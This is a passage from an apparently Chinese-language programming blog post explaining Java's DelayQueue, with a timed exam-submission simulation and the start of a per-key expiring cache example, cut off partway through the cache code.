&#x7684;&#x503C;&#x65F6;&#xFF0C;&#x5C06;&#x53D1;&#x751F;&#x5230;&#x671F;&#x3002;<br>&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;take&#x6216;poll&#x79FB;&#x9664;&#x672A;&#x5230;&#x671F;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5C06;&#x8FD9;&#x4E9B;&#x5143;&#x7D20;&#x4F5C;&#x4E3A;&#x6B63;&#x5E38;&#x5143;&#x7D20;&#x5BF9;&#x5F85;&#x3002;&#x4F8B;&#x5982;&#xFF0C;size&#x65B9;&#x6CD5;&#x540C;&#x65F6;&#x8FD4;&#x56DE;&#x5230;&#x671F;&#x548C;&#x672A;&#x5230;&#x671F;&#x5143;&#x7D20;&#x7684;&#x8BA1;&#x6570;&#x3002;&#x6B64;&#x961F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F; null&#x5143;&#x7D20;&#x3002;</p>","more":"<p>DelayQueue&#x961F;&#x5217;&#x4E2D;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x4E86;Delayed&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x91CC;&#x9762;&#x5FC5;&#x987B;&#x5B9E;&#x73B0;getDelay()&#x548C;compareTo()&#x65B9;&#x6CD5;&#x3002;&#x524D;&#x8005;&#x7528;&#x4E8E;&#x53D6;DelayQueue&#x91CC;&#x9762;&#x7684;&#x5143;&#x7D20;&#x65F6;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5230;&#x4E86;&#x5EF6;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x4E88;&#x83B7;&#x53D6;&#xFF0C;&#x662F;&#x5219;&#x83B7;&#x53D6;&#x3002;  compareTo()&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x961F;&#x5217;&#x5185;&#x90E8;&#x7684;&#x6392;&#x5E8F;&#x3002;compareTo &#x65B9;&#x6CD5;&#x9700;&#x63D0;&#x4F9B;&#x4E0E; getDelay &#x65B9;&#x6CD5;&#x4E00;&#x81F4;&#x7684;&#x6392;&#x5E8F;&#x3002;</p>\n<p>DelayQueue = BlockingQueue + PriorityQueue + Delayed<br>PriorityBlockingQueue = BlockingQueue + PriorityQueue<br>DelayQueue&#x7684;&#x5173;&#x952E;&#x5143;&#x7D20;BlockingQueue&#x3001;PriorityQueue&#x3001;Delayed&#x3002;<br>&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x8BF4;&#xFF0C;DelayQueue&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;&#x4F18;&#x5148;&#x961F;&#x5217;&#xFF08;PriorityQueue&#xFF09;&#x5B9E;&#x73B0;&#x7684;BlockingQueue&#xFF0C;&#x4F18;&#x5148;&#x961F;&#x5217;&#x7684;&#x6BD4;&#x8F83;&#x57FA;&#x51C6;&#x503C;&#x662F;&#x65F6;&#x95F4;&#x3002;&#x901A;&#x8FC7;PriorityQueue&#xFF0C;&#x53EF;&#x4EE5;&#x4F18;&#x5148;&#x5904;&#x7406;&#x6700;&#x7D27;&#x6025;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5229;&#x7528;BlockingQueue&#xFF0C;&#x80FD;&#x9632;&#x6B62;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x4E0D;&#x65AD;&#x8F6E;&#x8BE2;&#xFF0C;&#x63D0;&#x9AD8;&#x4E86;&#x6027;&#x80FD;&#x3002;&#x5728;&#x5F88;&#x591A;&#x9700;&#x8981;&#x56DE;&#x6536;&#x5BF9;&#x8C61;&#x7684;&#x573A;&#x666F;&#x90FD;&#x80FD;&#x7528;&#x4E0A;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4EE3;&#x7801;&#x793A;&#x4F8B;\"><a href=\"#&#x4EE3;&#x7801;&#x793A;&#x4F8B;\" class=\"headerlink\" title=\"&#x4EE3;&#x7801;&#x793A;&#x4F8B;\"></a>&#x4EE3;&#x7801;&#x793A;&#x4F8B;</h3><h4 id=\"&#x573A;&#x666F;&#x4E00;\"><a href=\"#&#x573A;&#x666F;&#x4E00;\" class=\"headerlink\" title=\"&#x573A;&#x666F;&#x4E00;\"></a>&#x573A;&#x666F;&#x4E00;</h4><p>&#x6A21;&#x62DF;&#x4E00;&#x4E2A;&#x8003;&#x8BD5;&#x7684;&#x65E5;&#x5B50;&#xFF0C;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x5F53;&#x65F6;&#x95F4;&#x5230;&#x4E86;&#xFF0C;&#x6216;&#x5B66;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x4E86;&#x8003;&#x8BD5;&#x7ED3;&#x675F;&#x3002;&#x4E3B;&#x8981;&#x6CE8;&#x610F;&#x7684;&#xFF1A;<br>1&#x3001;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x8003;&#x751F;&#x5B8C;&#x6210;&#x8BD5;&#x5377;&#x65F6;&#x95F4;&#x6700;&#x5C0F;&#x5E94;&#x4E3A;30&#x5206;&#x949F;<br>2&#x3001;&#x5BF9;&#x4E8E;&#x80FD;&#x591F;&#x5728;120&#x5206;&#x949F;&#x5185;&#x4EA4;&#x5377;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x8FD9;&#x4E9B;&#x8003;&#x751F;&#x4EA4;&#x5377;<br>3&#x3001;&#x5BF9;&#x4E8E;120&#x5206;&#x949F;&#x5185;&#x6CA1;&#x6709;&#x5B8C;&#x6210;&#x8003;&#x8BD5;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5728;120&#x5206;&#x949F;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#x540E;&#x9700;&#x8981;&#x8BA9;&#x4ED6;&#x4EEC;&#x5F3A;&#x5236;&#x4EA4;&#x5377;<br>4&#x3001;&#x5728;&#x6240;&#x6709;&#x7684;&#x8003;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x5173;&#x95ED;</p>\n<p><strong>&#x4E0B;&#x9762;&#x662F;&#x81EA;&#x5DF1;&#x4FEE;&#x6539;&#x4E86;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bbk.demo;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.Iterator;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\">import java.util.concurrent.DelayQueue;</span><br><span class=\"line\">import java.util.concurrent.Delayed;</span><br><span class=\"line\">import java.util.concurrent.TimeUnit;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * DelayQueue</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @project Demo</span><br><span class=\"line\"> * @create at 2015-10-6 &#x4E0B;&#x5348;4:37:31</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class Exam {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        </span><br><span class=\"line\">        int studentNumber = 20;</span><br><span class=\"line\">        CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1);</span><br><span class=\"line\">        DelayQueue&lt; Student&gt; students = new DelayQueue&lt;Student&gt;();</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        for (int i = 0; i &lt; studentNumber; i++) {</span><br><span class=\"line\">            students.put(new Student(&quot;student&quot;+(i+1), 30+random.nextInt(120),countDownLatch));</span><br><span class=\"line\">        }</span><br><span class=\"line\">        Thread teacherThread =new Thread(new Teacher(students)); </span><br><span class=\"line\">        students.put(new EndExam(students, 120,countDownLatch,teacherThread));</span><br><span class=\"line\">        teacherThread.start();</span><br><span class=\"line\">        countDownLatch.await();</span><br><span class=\"line\">        System.out.println(&quot; &#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#xFF0C;&#x5168;&#x90E8;&#x4EA4;&#x5377;&#xFF01;&quot;);  </span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class Student implements Runnable,Delayed{</span><br><span class=\"line\"></span><br><span class=\"line\">    private String name;</span><br><span class=\"line\">    private long workTime;</span><br><span class=\"line\">    private long submitTime;</span><br><span class=\"line\">    private boolean isForce = false;</span><br><span class=\"line\">    private CountDownLatch countDownLatch;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Student(){}</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Student(String name,long workTime,CountDownLatch countDownLatch){</span><br><span class=\"line\">        this.name = name;</span><br><span class=\"line\">        this.workTime = workTime;</span><br><span class=\"line\">        //&#x63D0;&#x4EA4;&#x65F6;&#x95F4; = &#x5F53;&#x524D;&#x65F6;&#x95F4; + &#x4F5C;&#x7B54;&#x65F6;&#x95F4;</span><br><span class=\"line\">        this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime();</span><br><span class=\"line\">        this.countDownLatch = countDownLatch;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int compareTo(Delayed o) {</span><br><span class=\"line\">        // &#x6309;&#x7167;&#x4F5C;&#x7B54;&#x65F6;&#x957F;&#x6B63;&#x5E8F;&#x6392;&#x5E8F;&#xFF08;&#x961F;&#x5934;&#x653E;&#x7684;&#x662F;&#x4F60;&#x8BA4;&#x4E3A;&#x6700;&#x5148;&#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x4F53;&#x73B0;&#x4E3A;&#x9700;&#x8981;&#x6700;&#x5148;&#x4EA4;&#x5377;&#xFF0C;&#x6240;&#x4EE5;&#x662F;&#x6B63;&#x5E8F;&#xFF09;</span><br><span class=\"line\">        if(o == null || ! (o instanceof Student)) return 1;</span><br><span class=\"line\">        if(o == this) return 0;</span><br><span class=\"line\">        Student s = (Student)o;</span><br><span class=\"line\">        if (this.workTime &gt; s.workTime) {</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        }else if (this.workTime == s.workTime) {</span><br><span class=\"line\">            return 0;</span><br><span class=\"line\">        }else {</span><br><span class=\"line\">            return -1;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public long getDelay(TimeUnit unit) {</span><br><span class=\"line\">    \t// &#x63D0;&#x4EA4;&#x65F6;&#x95F4; - &#x5F53;&#x524D;&#x65F6;&#x95F4;  &#x7528;&#x6765;&#x5224;&#x65AD;&#x5EF6;&#x8FDF;&#x662F;&#x5426;&#x5230;&#x671F;&#xFF08;&#x5373;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x8BD5;&#x5377;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;take&#x6216;&#x8005;poll&#xFF09;</span><br><span class=\"line\">        // &#x8FD4;&#x56DE;&#x6B63;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x8FD8;&#x6709;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x5DF2;&#x7ECF;&#x5728;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x524D;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#x4EE3;&#x8868;&#x53EF;&#x4EE5;take&#x6216;&#x8005;poll</span><br><span class=\"line\">        return unit.convert(submitTime - System.nanoTime(),  TimeUnit.NANOSECONDS);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        if (isForce) {</span><br><span class=\"line\">            System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; 120&#x5206;&#x949F;&quot; );</span><br><span class=\"line\">        }else {</span><br><span class=\"line\">            System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; &quot;+workTime +&quot; &#x5206;&#x949F;&quot;);  </span><br><span class=\"line\">        }</span><br><span class=\"line\">        countDownLatch.countDown();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public boolean isForce() {</span><br><span class=\"line\">        return isForce;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setForce(boolean isForce) {</span><br><span class=\"line\">        this.isForce = isForce;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic String getName() {</span><br><span class=\"line\">\t\treturn name;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setName(String name) {</span><br><span class=\"line\">\t\tthis.name = name;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic long getWorkTime() {</span><br><span class=\"line\">\t\treturn workTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setWorkTime(long workTime) {</span><br><span class=\"line\">\t\tthis.workTime = workTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic long getSubmitTime() {</span><br><span class=\"line\">\t\treturn submitTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setSubmitTime(long submitTime) {</span><br><span class=\"line\">\t\tthis.submitTime = submitTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class EndExam extends Student{</span><br><span class=\"line\"></span><br><span class=\"line\">    private DelayQueue&lt;Student&gt; students;</span><br><span class=\"line\">    private CountDownLatch countDownLatch;</span><br><span class=\"line\">    private Thread teacherThread;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public EndExam(DelayQueue&lt;Student&gt; students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) {</span><br><span class=\"line\">        super(&quot;&#x5F3A;&#x5236;&#x6536;&#x5377;&quot;, workTime,countDownLatch);</span><br><span class=\"line\">        this.students = students;</span><br><span class=\"line\">        this.countDownLatch = countDownLatch;</span><br><span class=\"line\">        this.teacherThread = teacherThread;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        teacherThread.interrupt();</span><br><span class=\"line\">        Student tmpStudent;</span><br><span class=\"line\">        for (Iterator&lt;Student&gt; iterator2 = students.iterator(); iterator2.hasNext();) {</span><br><span class=\"line\">            tmpStudent = iterator2.next();</span><br><span class=\"line\">            tmpStudent.setForce(true);</span><br><span class=\"line\">            System.out.println(tmpStudent.getName()+&quot;===&quot;+tmpStudent.getDelay(TimeUnit.NANOSECONDS));</span><br><span class=\"line\">            tmpStudent.run();</span><br><span class=\"line\">        }</span><br><span class=\"line\">        countDownLatch.countDown();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class Teacher implements Runnable{</span><br><span class=\"line\"></span><br><span class=\"line\">    private DelayQueue&lt;Student&gt; students;</span><br><span class=\"line\">    public Teacher(DelayQueue&lt;Student&gt; students){</span><br><span class=\"line\">        this.students = students;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            System.out.println(&quot; test start&quot;);</span><br><span class=\"line\">            while(!Thread.interrupted()){</span><br><span class=\"line\">            \tStudent s = students.take();</span><br><span class=\"line\">            \tSystem.out.println(s.getName()+&quot;===&quot;+s.getDelay(TimeUnit.NANOSECONDS));</span><br><span class=\"line\">                s.run();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        } catch (Exception e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"&#x573A;&#x666F;&#x4E8C;\"><a href=\"#&#x573A;&#x666F;&#x4E8C;\" class=\"headerlink\" title=\"&#x573A;&#x666F;&#x4E8C;\"></a>&#x573A;&#x666F;&#x4E8C;</h4><p>&#x5411;&#x7F13;&#x5B58;&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;key&#x8BBE;&#x5B9A;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5C06;&#x8D85;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key&#x6E05;&#x9664;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;<br>1&#x3001;&#x5F53;&#x5411;&#x7F13;&#x5B58;&#x4E2D;&#x6DFB;&#x52A0;key-value&#x5BF9;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;key&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x8FD8;&#x6CA1;&#x6709;&#x8FC7;&#x671F;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x8FD9;&#x4E2A;key&#x5BF9;&#x5E94;&#x7684;&#x65B0;&#x8FC7;&#x671F;&#x65F6;&#x95F4;<br>2&#x3001;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8BA9;DelayQueue&#x5C06;&#x5176;&#x5DF2;&#x4FDD;&#x5B58;&#x7684;key&#x5220;&#x9664;&#xFF0C;&#x9700;&#x8981;&#x91CD;&#x5199;&#x5B9E;&#x73B0;Delayed&#x63A5;&#x53E3;&#x6DFB;&#x52A0;&#x5230;DelayQueue&#x7684;DelayedItem&#x7684;hashCode&#x51FD;&#x6570;&#x548C;equals&#x51FD;&#x6570;<br>3&#x3001;&#x5F53;&#x7F13;&#x5B58;&#x5173;&#x95ED;&#xFF0C;&#x76D1;&#x63A7;&#x7A0B;&#x5E8F;&#x4E5F;&#x5E94;&#x5173;&#x95ED;&#xFF0C;&#x56E0;&#x800C;&#x76D1;&#x63A7;&#x7EBF;&#x7A0B;&#x5E94;&#x5F53;&#x7528;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;</p>\n<p><strong>&#x7F51;&#x4E0A;&#x641C;&#x5230;&#x7684;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *Cache.java</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * Created on 2014-1-11 &#x4E0A;&#x5348;11:30:36 by sunzhenchao mychaoyue2011@163.com</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class Cache&lt;K, V&gt; {</span><br><span class=\"line\"></span><br><span class=\"line\">    public ConcurrentHashMap&lt;K, V&gt; map = new ConcurrentHashMap&lt;K, V&gt;();</span><br><span class=\"line\">    public DelayQueue&lt;DelayedItem&lt;K&gt;&gt; queue = new DelayQueue&lt;DelayedItem&lt;K&gt;&gt;();</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    public void put(K k,V v,long liveTime){</span><br><span class=\"line\">        V v2 = map.put(k, v);</span><br><span class=\"line\">        DelayedItem&lt;K&gt; tmpItem = new DelayedItem&lt;K&gt;(k, liveTime);</span><br><span class=\"line\">        if (v2 != null) {</span><br><span class=\"line\">            queue.remove(tmpItem);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        queue.put(tmpItem);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Cache(){</span><br><span class=\"line\">        Thread t = new Thread(){</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void 